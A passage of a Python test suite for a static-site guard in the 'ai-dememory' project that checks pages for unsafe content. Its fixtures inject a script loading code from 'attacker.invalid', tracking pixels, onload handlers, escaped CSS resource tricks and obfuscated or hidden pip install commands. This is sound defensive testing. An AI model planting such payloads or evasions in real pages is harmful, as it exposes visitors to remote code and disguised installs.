            "python -m pip install --index-url https://test.pypi.org/simple/ ai-dememory==2.1.1rc2",
            install,
        )

    def test_checked_in_site_passes_guard(self) -> None:
        self.assertEqual([], audit_site())

    def test_guard_rejects_broken_local_link(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    'href="architecture/"', 'href="missing/"', 1
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("broken local reference 'missing/'" in error for error in errors))

    def test_guard_rejects_automatic_external_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</head>", '<script src="https://example.com/tracker.js"></script></head>', 1
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("automatic external resource is forbidden" in error for error in errors))

    def test_guard_rejects_iframe_srcdoc(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<iframe title="unsafe" srcdoc="&lt;script&gt;void 0&lt;/script&gt;"></iframe>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("iframe srcdoc is forbidden" in error for error in errors))

    def test_guard_rejects_inline_event_handler_attributes(self) -> None:
        attributes = (
            'onload="alert(1)"',
            'oNlOaD="alert(1)"',
            "onload",
            'onload="" ONLOAD=""',
        )
        for attribute_text in attributes:
            with self.subTest(attributes=attribute_text), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>",
                        f'<img src="assets/favicon.svg" alt="" {attribute_text}>\n</main>',
                        1,
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any(
                        "inline HTML event handler attribute 'onload' is forbidden" in error
                        for error in errors
                    )
                )

    def test_guard_rejects_static_interactive_controls_with_command_values(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<input value="ai-dememory mcp-config --client codex">\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("static interactive <input> controls are forbidden" in error for error in errors)
            )

    def test_guard_rejects_ping_attributes(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<a href="./" ping="/receipt">Unsafe receipt</a>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("HTML ping attribute is forbidden" in error for error in errors)
            )

    def test_guard_allows_data_attributes_on_local_resources(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<img src="assets/favicon.svg" alt="" data-onload="" data-action="copy">\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_external_srcset_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<img src="assets/favicon.svg" srcset="https://example.com/leak.png 2x" alt="">\n</main>',
                    1,
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("automatic external resource is forbidden" in error for error in errors))

    def test_guard_rejects_extended_automatic_resource_attributes(self) -> None:
        fixtures = (
            (
                "<body>",
                '<body background="https://example.com/pixel.png">',
            ),
            (
                "</head>",
                '<link rel="preload" as="image" imagesrcset="https://example.com/leak.png 2x"></head>',
            ),
            (
                "</main>",
                '<img src="assets/favicon.svg" lowsrc="https://example.com/legacy.png" alt="">\n</main>',
            ),
            (
                "</main>",
                '<svg><feImage href="https://example.com/leak.svg"></feImage></svg>\n</main>',
            ),
        )
        for needle, replacement in fixtures:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(needle, replacement, 1),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("automatic external resource is forbidden" in error for error in errors)
                )

    def test_guard_allows_local_extended_automatic_resources(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8")
                .replace("<body>", '<body background="assets/favicon.svg">', 1)
                .replace(
                    "</head>",
                    '<link rel="preload" as="image" href="assets/favicon.svg" imagesrcset="assets/favicon.svg 1x"></head>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_external_svg_href_resources(self) -> None:
        for element in ("image", "pattern", "use"):
            with self.subTest(element=element), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>",
                        f'<svg><{element} href="https://github.com/external.svg"></{element}></svg>\n</main>',
                        1,
                    ),
                    encoding="utf-8",
                )
                errors = audit_site(REPO_ROOT, copied)
                self.assertTrue(any("automatic external resource is forbidden" in error for error in errors))

    def test_guard_rejects_svg_url_presentation_resources(self) -> None:
        fixtures = (
            '<svg><rect fill="url(https://example.com/pixel.svg)"></rect></svg>',
            '<svg><rect filter="u\\72l(https://example.com/filter.svg)"></rect></svg>',
        )
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>", f"{fixture}\n</main>", 1
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("SVG URL-bearing presentation attribute" in error for error in errors)
                )

    def test_guard_rejects_svg_dynamic_elements(self) -> None:
        fixtures = (
            '<svg><set attributeName="href" to="https://example.com/pixel.svg"></set></svg>',
            '<svg><animate attributeName="href" to="https://example.com/pixel.svg"></animate></svg>',
            '<svg><animateMotion path="M0,0"></animateMotion></svg>',
            '<svg><svg:animate attributeName="href" to="https://example.com/pixel.svg"></svg:animate></svg>',
            '<svg><a:set attributeName="href" to="https://example.com/pixel.svg"></a:set></svg>',
            '<svg><é:set attributeName="href" to="https://example.com/pixel.svg"></é:set></svg>',
            '<svg:svg><a:set attributeName="href" to="https://example.com/pixel.svg"></a:set></svg:svg>',
        )
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace("</main>", f"{fixture}\n</main>", 1),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(any("SVG dynamic" in error for error in errors))

    def test_guard_allows_static_svg_without_resource_reference(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    '<svg viewBox="0 0 1 1"><rect fill="currentColor"></rect></svg>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_allows_local_svg_presentation_fragment(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    "<svg><defs><marker id=\"local-marker\"></marker></defs>"
                    '<path marker-end="url(#local-marker)"></path></svg>\n</main>',
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_unallowlisted_local_active_assets(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            (copied / "assets" / "unreviewed.js").write_text("void 0;\n", encoding="utf-8")
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</head>", '<script src="assets/unreviewed.js"></script></head>', 1
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("local active asset is not allowlisted" in error for error in errors))

    def test_guard_rejects_module_script_type(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</head>",
                    '<script type="module" src="assets/site.js"></script></head>',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("module scripts are forbidden" in error for error in errors))

    def test_guard_rejects_any_unreviewed_site_javascript_change(self) -> None:
        changes = (
            (
                "computed property and constructed external script",
                "const script = document[\"create\" + \"Element\"](\"script\");\n"
                "script.src = \"https:\" + \"//attacker.invalid/payload.js\";\n"
                "document.body[\"append\"](script);\n",
            ),
            ("benign content drift", 'const important = "copy";\n'),
        )
        for label, change in changes:
            with self.subTest(change=label), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                javascript = copied / "assets" / "site.js"
                javascript.write_text(
                    change + javascript.read_text(encoding="utf-8"),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("assets/site.js: content does not match the approved reviewed fingerprint" in error for error in errors)
                )

    def test_guard_rejects_dynamic_active_asset_primitives(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            javascript = copied / "assets" / "site.js"
            javascript.write_text(
                'document.createElement("script");\n' + javascript.read_text(encoding="utf-8"),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("assets/site.js: content does not match the approved reviewed fingerprint" in error for error in errors)
            )

    def test_guard_audits_allowlisted_svg_assets(self) -> None:
        payloads = (
            "<script>void 0</script>",
            '<set attributeName="href" to="https://example.com/pixel.svg"></set>',
            '<svg:animate attributeName="href" to="https://example.com/pixel.svg"></svg:animate>',
            '<a:set attributeName="href" to="https://example.com/pixel.svg"></a:set>',
            '<é:set attributeName="href" to="https://example.com/pixel.svg"></é:set>',
            '<style>@import "unreviewed.css";</style>',
            '<style>@im\\70ort "unreviewed.css";</style>',
            '<style>.probe { background-image: u\\72l("unreviewed.svg"); }</style>',
        )
        for payload in payloads:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                favicon = copied / "assets" / "favicon.svg"
                favicon.write_text(
                    favicon.read_text(encoding="utf-8").replace(
                        "</svg>", f"{payload}</svg>", 1
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("assets/favicon.svg: active SVG content or references are forbidden" in error for error in errors)
                )

    def test_guard_rejects_inline_css_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "<body>",
                    '<body style="background-image: url(https://example.com/pixel.png)">',
                    1,
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(any("inline CSS imports/resources are forbidden" in error for error in errors))

    def test_guard_rejects_escaped_inline_css_resource(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "<body>",
                    '<body style="background-image: u\\72l(https://example.com/pixel.png)">',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("inline CSS imports/resources are forbidden" in error for error in errors))

    def test_guard_rejects_escaped_css_resource_tokens(self) -> None:
        payloads = (
            '@im\\70ort "https://example.com/tracker.css";',
            '.probe { background-image: u\\72l("https://example.com/pixel.png"); }',
            '.probe { background-image: image-set("https://example.com/pixel.png" 1x); }',
            '.probe { background-image: image("https://example.com/pixel.png"); }',
        )
        for payload in payloads:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                stylesheet = copied / "assets" / "site.css"
                stylesheet.write_text(
                    stylesheet.read_text(encoding="utf-8") + f"\n{payload}\n",
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("assets/site.css: resource imports or references are forbidden" in error for error in errors)
                )

    def test_guard_allows_css_background_without_resource_url(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            stylesheet = copied / "assets" / "site.css"
            stylesheet.write_text(
                stylesheet.read_text(encoding="utf-8") + "\n.probe { background: var(--paper); }\n",
                encoding="utf-8",
            )

            self.assertEqual([], audit_site(REPO_ROOT, copied))

    def test_guard_rejects_missing_stable_wizard_command(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            for page in copied.rglob("*.html"):
                page.write_text(
                    page.read_text(encoding="utf-8").replace(
                        "ai-dememory init ~/code/my-memory --wizard",
                        "ai-dememory init ~/code/my-memory",
                    ),
                    encoding="utf-8",
                )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(
                any(
                    "stable 2.1.1 command block is missing "
                    "'ai-dememory init ~/code/my-memory --wizard'"
                    for error in errors
                )
            )

    def test_guard_rejects_mutable_vcs_install_in_stable_block(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "pipx install ai-dememory",
                    "pipx install git+https://github.com/GonzaloTorreras/ai-dememory.git",
                    1,
                ),
                encoding="utf-8",
            )
            errors = audit_site(REPO_ROOT, copied)
            self.assertTrue(
                any("package command is not allowlisted" in error for error in errors)
            )

    def test_guard_rejects_mutable_vcs_install_in_any_stable_doc(self) -> None:
        errors = _stable_command_errors(
            "pipx install git+https://github.com/GonzaloTorreras/ai-dememory.git",
            "2.1.1",
            "fixture",
        )
        self.assertTrue(any("not allowlisted" in error for error in errors))

    def test_guard_rejects_version_pinned_install_in_stable_block(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "pipx install ai-dememory",
                    "pipx install ai-dememory==2.1.1",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("not allowlisted" in error for error in errors))

    def test_guard_validates_visible_commands_outside_release_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    "<pre>ai-dememory mcp --stdio</pre>\n</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "site/index.html" in error and "direct MCP server" in error
                    for error in errors
                )
            )

    def test_guard_validates_commands_in_user_reachable_html_states(self) -> None:
        unsafe_command = "ai-dememory mcp --stdio"
        forms = (
            f'<div aria-hidden="true"><pre>{unsafe_command}</pre></div>',
            f"<details><summary>More</summary><pre>{unsafe_command}</pre></details>",
            (
                '<button popovertarget="qa-popover">Show</button>'
                f'<div id="qa-popover" popover><pre>{unsafe_command}</pre></div>'
            ),
            f"<noscript><pre>{unsafe_command}</pre></noscript>",
        )
        for markup in forms:
            with self.subTest(markup=markup), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "</main>", f"{markup}\n</main>", 1
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any(
                        "site/index.html" in error and "direct MCP server" in error
                        for error in errors
                    )
                )

    def test_guard_rejects_release_markers_on_hidden_content(self) -> None:
        hidden_forms = (
            'data-release="published-2.1.1" hidden',
            'data-release="published-2.1.1" aria-hidden="true"',
            'data-release="published-2.1.1" style="display: none"',
            'data-release="published-2.1.1" style="visibility: hidden"',
        )
        for hidden_form in hidden_forms:
            with self.subTest(hidden_form=hidden_form), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        'data-release="published-2.1.1"',
                        hidden_form,
                        1,
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(any("non-rendered content" in error for error in errors))

    def test_guard_rejects_release_markers_inside_templates(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    '<div class="code-block" data-copy-block data-release="published-2.1.1">',
                    '<template><div class="code-block" data-copy-block data-release="published-2.1.1">',
                    1,
                ).replace("</main>", "</template>\n</main>", 1),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("non-rendered content" in error for error in errors))

    def test_guard_rejects_ambiguous_or_noncanonical_release_markup(self) -> None:
        canonical = '<div class="code-block" data-copy-block data-release="published-2.1.1">'
        mutations = (
            '<div class="code-block visually-hidden" data-copy-block data-release="published-2.1.1">',
            '<div style="display:none" style="" class="code-block" data-copy-block data-release="published-2.1.1">',
            '<dialog><div class="code-block" data-copy-block data-release="published-2.1.1">',
            '<datalist><div class="code-block" data-copy-block data-release="published-2.1.1">',
            '<span hidden/></span><div class="code-block" data-copy-block data-release="published-2.1.1">',
            '<div hidden></span><div class="code-block" data-copy-block data-release="published-2.1.1">',
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(canonical, mutation, 1),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any(
                        marker in error
                        for error in errors
                        for marker in (
                            "canonical visible code-block",
                            "non-rendered content",
                            "duplicate HTML attribute",
                            "mismatched closing tag",
                            "self-closing syntax",
                        )
                    )
                )

    def test_guard_rejects_nested_markup_inside_release_commands(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "ai-dememory init ~/code/my-memory --wizard</code>",
                    "ai-dememory init ~/code/my-memory --wizard"
                    "<span hidden>\npython -m pip install $PKG</span></code>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("release command blocks must not contain nested markup" in error for error in errors),
                errors,
            )

    def test_guard_rejects_comment_tokens_inside_release_commands(self) -> None:
        comment_forms = (
            "<!-->\npython -m pip install example-package\n-->",
            "<!--->\npython -m pip install example-package\n-->",
        )
        for comment in comment_forms:
            with self.subTest(comment=comment), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                home = copied / "index.html"
                home.write_text(
                    home.read_text(encoding="utf-8").replace(
                        "ai-dememory init ~/code/my-memory --wizard</code>",
                        "ai-dememory init ~/code/my-memory --wizard"
                        f"\n{comment}</code>",
                        1,
                    ),
                    encoding="utf-8",
                )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(
                    any("release command blocks must not contain HTML comments" in error for error in errors),
                    errors,
                )

    def test_guard_rejects_comment_tokens_in_auditable_content(self) -> None:
        markup = "<p><!-->p\\ip install example-package\n--></p>"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("HTML comments are forbidden in auditable site content" in error for error in errors),
                errors,
            )

    def test_guard_rejects_declarative_shadow_dom_command_content(self) -> None:
        markup = (
            "<div><template shadowrootmode=\"open\"><p><code>"
            "python -m pip install --index-url https://test.pypi.org/simple/ "
            "ai-dememory==2.1.2rc1"
            "</code></p></template></div>"
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("declarative Shadow DOM attributes are forbidden" in error for error in errors),
                errors,
            )

    def test_guard_rejects_css_generated_command_content(self) -> None:
        markup = (
            "<style>.release-bypass::before { content: \"python -m pip install "
            "--index-url https://test.pypi.org/simple/ ai-dememory==2.1.2rc1\"; "
            "white-space: pre; }</style><span class=\"release-bypass\"></span>"
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("CSS generated content is not allowlisted" in error for error in errors),
                errors,
            )

    def test_guard_rejects_css_comments_in_auditable_content(self) -> None:
        markup = (
            "<style>.release-bypass::before { content/**/: \"python -m pip install "
            "example-package\"; white-space: pre; }</style><span class=\"release-bypass\"></span>"
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("CSS comments are forbidden in the audited static site" in error for error in errors),
                errors,
            )

    def test_guard_rejects_unallowlisted_css_data_labels(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            install = copied / "install/index.html"
            install.write_text(
                install.read_text(encoding="utf-8").replace(
                    'data-label="Recall"',
                    'data-label="python -m pip install --index-url https://test.pypi.org/simple/ ai-dememory==2.1.2rc1"',
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "data-label renders through reviewed CSS and is not allowlisted" in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_hidden_content_inside_copyable_commands(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    "<div class=\"code-block\" data-copy-block><pre tabindex=\"0\"><code>echo safe"
                    "<span hidden>\npython -m pip install example-package</span></code></pre></div>"
                    "</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "copyable command blocks must carry a nonempty data-release marker" in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_untracked_visible_pre_blocks(self) -> None:
        commands = (
            "pypy3 -m pip install $PKG",
            'zsh -c "python -m pip install $PKG"',
            "pipenv run pip install $PKG",
            "poetry run pip install $PKG",
            "conda run -n review python -m pip install $PKG",
            "pipx run $PKG",
            "uvx $PKG",
            "conda install ai-dememory==2.1.1rc1",
            "pipenv install ai-dememory==2.1.1rc1",
            "poetry add ai-dememory==2.1.1rc1",
            "pdm add ai-dememory==2.1.1rc1",
            "p^ip install example-package",
            "p%EMPTY%ip install example-package",
            "p!EMPTY!ip install example-package",
            "pi\\\np install example-package",
            "p^\nip install example-package",
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            injected_blocks = "".join(
                f"<pre><code>{command}</code></pre>" for command in commands
            )
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{injected_blocks}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            marker = "preformatted command blocks must use a canonical tracked data-release command block"
            self.assertTrue(any(marker in error for error in errors), errors)

    def test_guard_rejects_untracked_pre_in_user_reachable_or_alternate_states(self) -> None:
        command = (
            "<pre><code>python -m pip install --index-url https://test.pypi.org/simple/ "
            "--requirement requirements.txt</code></pre>"
        )
        markup = "".join(
            (
                f"<details><summary>Optional installer</summary>{command}</details>",
                f'<div aria-hidden="true">{command}</div>',
                f'<div class="visually-hidden">{command}</div>',
                f"<noscript>{command}</noscript>",
            )
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "preformatted command blocks must use a canonical tracked data-release command block"
                    in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_untracked_installer_text_outside_release_blocks(self) -> None:
        markup = "".join(
            (
                "<p>p^ip install example-package</p>",
                "<p><code>python -m pip install --index-url https://test.pypi.org/simple/ "
                "$PKG</code></p>",
                "<div style=\"white-space: pre\">pi\\\np install example-package</div>",
                "<p>conda install ai-dememory==2.1.1rc1</p>",
            )
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "untracked package installer text is forbidden" in error
                    for error in errors
                ),
                errors,
            )
            self.assertTrue(
                any(
                    "dynamic or fragmented shell syntax is forbidden in untracked auditable site content"
                    in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_fragmented_untracked_installer_text(self) -> None:
        commands = (
            "p\\ip install example-package",
            "p\\i\\p install example-package",
            'p"i"p install example-package',
            "p''ip install example-package",
            'python -m p""ip install --requirement requirements.txt',
            'bash -c "p\\ip install example-package"',
            "pi\\\np in\\\nstall example-package",
            "p${EMPTY}ip in${EMPTY}stall example-package",
            "p{,}ip in{,}stall example-package",
            "uvx $PKG",
            "npx $PKG",
            "bunx $PKG",
        )
        markup = "".join(f"<p><code>{command}</code></p>" for command in commands)
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "untracked package installer text is forbidden" in error
                    for error in errors
                ),
                errors,
            )
            self.assertTrue(
                any(
                    "dynamic or fragmented shell syntax is forbidden in untracked auditable site content"
                    in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_untracked_ai_dememory_package_routes(self) -> None:
        commands = (
            "npm install ai-dememory",
            "pnpm add ai-dememory",
            "yarn add ai-dememory",
            "bun add ai-dememory",
